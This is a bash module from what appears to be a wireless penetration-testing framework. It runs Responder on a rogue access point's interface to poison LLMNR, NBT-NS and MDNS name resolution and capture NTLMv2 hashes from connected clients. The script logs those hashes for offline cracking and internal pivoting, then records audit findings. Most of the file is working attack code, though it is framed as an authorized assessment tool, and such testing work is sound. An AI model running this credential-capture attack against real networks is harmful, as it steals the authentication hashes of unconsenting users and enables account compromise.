#!/usr/bin/env bash
# MODULE_META
# NAME="Responder Pivot & Hash Capture"
# CATEGORY="G"
# DEPS="F1"
# CRITICAL="no"
# TOOLS="responder"
# DESC="Run Responder to capture LLMNR/NBT-NS hashes from connected clients"
# REQS="managed_iface"
# PCAP="no"
# TIMED="yes"
# DECODE="none"

#===============================================================================
#  modules/g6_responder_pivot.sh
#  G6: Responder Pivot (Golden Wrapper)
#
#  METHODOLOGY:
#  1. Launch Responder on the active WiFi interface.
#  2. Capture LLMNR, NBT-NS, and MDNS traffic from clients on the Rogue AP.
#  3. Log captured hashes for offline cracking and internal pivoting.
#===============================================================================

set -euo pipefail

# SNR Safeguard (Inherited from core)
C_PROMPT="${ASTRA_COLOR_PROMPT:-}"
C_VAR="${ASTRA_COLOR_VAR:-}"
C_RESET="${ASTRA_COLOR_RESET:-}"

# Inputs from Environment
INTERFACE="${WIFI_INTERFACE:-}"
SCAN_TIME="${SCAN_TIME:-60}"
SESSION_DIR="${SESSION_DIR:-.}"
EVIDENCE_DIR="${SESSION_EVIDENCE_DIR:-${SESSION_DIR}/evidence}"
ASTRA_BIN="${ASTRA_BIN:-wifi-astra}"
TC_ID="G6"

if [[ -z "$INTERFACE" ]]; then
    echo "[!] WIFI_INTERFACE not set."
    exit 1
fi

echo -e "${C_PROMPT}[*]${C_RESET} Starting Responder pivot on ${C_VAR}${INTERFACE}${C_RESET}..."
"$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 20 --status "Launching Responder..."

LOG_FILE="${EVIDENCE_DIR}/${TC_ID}_responder.log"

if ! command -v responder &>/dev/null; then
    echo "[!] responder tool not found."
    echo "responder not installed" > "$LOG_FILE"
    "$ASTRA_BIN" record-finding \
        --session-dir "$SESSION_DIR" \
        --tc "$TC_ID" \
        --type vulnerability \
        --name "[G6] Audit Skipped — responder Missing" \
        --severity INFO \
        --desc "Responder pivot could not run — responder is not installed. Install with: apt install responder" \
        --target "Local Clients" \
        --evidence "$LOG_FILE" \
        --rationale "responder is required to poison LLMNR/NBT-NS queries and capture NTLMv2 hashes from Windows clients."
    "$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 100 --status "Skipped — responder missing"
    exit 0
fi

# 1. 🛰️ DYNAMIC TELEMETRY HEARTBEAT (Background)
(
    ELAPSED=0
    while [[ "${ASTRA_INDEFINITE:-}" == "true" || $ELAPSED -lt $SCAN_TIME ]]; do
        if [[ "${ASTRA_INDEFINITE:-}" == "true" ]]; then
            "$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 50 --status "Responder active — ${ELAPSED}s elapsed (Ctrl+C to stop)"
            sleep 5
            ((ELAPSED+=5))
            continue
        fi
        PERCENT=$(( 20 + (ELAPSED * 70 / SCAN_TIME) ))
        [[ $PERCENT -gt 90 ]] && PERCENT=90
        STATUS="Responder active on ${INTERFACE}... ($(( SCAN_TIME - ELAPSED ))s left)"
        "$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent "$PERCENT" --status "$STATUS"
        sleep 5
        ((ELAPSED+=5))
    done
) &
TEL_PID=$!

# 2. RUN PRIMARY TOOL (Foreground in Window, Background with Wait otherwise)
if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
    # tee to LOG_FILE so hash detection works in both modes
    if [[ "${ASTRA_INDEFINITE:-}" == "true" ]]; then
        responder -I "$INTERFACE" -dwP 2>&1 | tee "$LOG_FILE" || true
    else
        timeout --foreground "$SCAN_TIME" responder -I "$INTERFACE" -dwP 2>&1 | tee "$LOG_FILE" || true
    fi
else
    if [[ "${ASTRA_INDEFINITE:-}" == "true" ]]; then
        responder -I "$INTERFACE" -dwP > "$LOG_FILE" 2>&1 &
    else
        timeout "$SCAN_TIME" responder -I "$INTERFACE" -dwP > "$LOG_FILE" 2>&1 &
    fi
    TOOL_PID=$!
    wait "$TOOL_PID" || true
fi

kill "$TEL_PID" 2>/dev/null || true

# 3. Final Signal & Reporting
"$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 100 --status "Mission Complete"

if grep -qiE "captured|Hash|NTLM" "$LOG_FILE" 2>/dev/null; then
     "$ASTRA_BIN" record-finding \
        --session-dir "$SESSION_DIR" \
        --tc "$TC_ID" \
        --type vulnerability \
        --name "LLMNR/NBT-NS Hash Capture" \
        --severity HIGH \
        --desc "Captured authentication hashes via LLMNR/NBT-NS poisoning on $INTERFACE." \
        --target "Local Clients" \
        --evidence "$LOG_FILE" \
        --rationale "Captured hashes can be cracked offline to recover cleartext credentials. This demonstrates susceptibility to local network name resolution poisoning."
else
    "$ASTRA_BIN" record-finding \
        --session-dir "$SESSION_DIR" \
        --tc "$TC_ID" \
        --type vulnerability \
        --name "[G6] Audit Complete" \
        --severity INFO \
        --desc "Completed Responder pivot on $INTERFACE. No hashes were captured during the test window." \
        --target "Local Clients" \
        --evidence "$LOG_FILE" \
        --rationale "Lack of captured hashes indicates that either clients are not using legacy name resolution protocols or they are otherwise mitigated (e.g., via GPO or LLMNR/NetBIOS disablement)."
fi


# Hold window if in tactical mode so user can see final output/errors
if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
    echo -e "\n${ASTRA_COLOR_BOLD:-}[*] Mission Complete. Window will close in 5s...${ASTRA_COLOR_RESET:-}"
    sleep 5
fi

exit 0
